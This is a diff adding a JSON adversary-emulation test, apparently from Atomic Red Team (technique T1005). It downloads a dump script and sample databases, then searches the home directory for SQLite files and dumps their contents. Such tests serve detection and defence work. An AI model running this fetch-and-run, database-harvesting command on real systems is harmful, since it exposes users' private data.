@@ -1,0 +1,105 @@
+{
+  "id": "00cbb875-7ae4-4cf1-b638-e543fd825300",
+  "name": "Find and dump sqlite databases (Linux)",
+  "description": "An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find \u0026 dump the database content.\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "ce7b571a-3dfc-4a92-8531-185c1e0082ab",
+      "type": "execute-command",
+      "data": {
+        "command": "cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;\n",
+        "command_type": "bash"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8dcb8748-8349-42a0-9c5e-cd6db44ef8be",
+      "type": "execute-command",
+      "data": {
+        "command": "rm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh \n",
+        "command_type": "bash"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8b61e8ab-9fca-4ced-b4e6-7b8135406ddd",
+      "name": "Check dependency 1/1",
+      "description": "Check if running on a Debian based machine.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v sqlite3)\" ]; then echo \"sqlite3 is installed\"; else echo \"sqlite3 is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v strings)\" ]; then echo \"strings is installed\"; else echo \"strings is NOT installed\"; exit 1; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "24dfb330-5644-43d9-bc7a-b2edb83d894b",
+      "name": "Resolve dependency 1/1",
+      "description": "Check if running on a Debian based machine.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then apt update \u0026\u0026 apt install -y binutils curl sqlite3; fi\nif grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then yum update -y \u0026\u0026 yum install -y binutils curl sqlite-devel; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a17900d9-16f5-4696-a844-a5ba1b54b49f",
+      "name": "Re-check dependency 1/1",
+      "description": "Check if running on a Debian based machine.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v sqlite3)\" ]; then echo \"sqlite3 is installed\"; else echo \"sqlite3 is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v strings)\" ]; then echo \"strings is installed\"; else echo \"strings is NOT installed\"; exit 1; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "ce7b571a-3dfc-4a92-8531-185c1e0082ab",
+      "p": "on-success",
+      "o": "8dcb8748-8349-42a0-9c5e-cd6db44ef8be"
+    },
+    {
+      "s": "ce7b571a-3dfc-4a92-8531-185c1e0082ab",
+      "p": "on-failure",
+      "o": "8dcb8748-8349-42a0-9c5e-cd6db44ef8be"
+    },
+    {
+      "s": "8b61e8ab-9fca-4ced-b4e6-7b8135406ddd",
+      "p": "on-success",
+      "o": "ce7b571a-3dfc-4a92-8531-185c1e0082ab"
+    },
+    {
+      "s": "8b61e8ab-9fca-4ced-b4e6-7b8135406ddd",
+      "p": "on-failure",
+      "o": "24dfb330-5644-43d9-bc7a-b2edb83d894b"
+    },
+    {
+      "s": "24dfb330-5644-43d9-bc7a-b2edb83d894b",
+      "p": "on-success",
+      "o": "a17900d9-16f5-4696-a844-a5ba1b54b49f"
+    },
+    {
+      "s": "a17900d9-16f5-4696-a844-a5ba1b54b49f",
+      "p": "on-failure",
+      "o": "ce7b571a-3dfc-4a92-8531-185c1e0082ab"
+    }
+  ],
+  "tags": [
+    "T1005",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_url",
+      "type": "url",
+      "description": "url of remote payload",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src"
+    }
+  ]
+}
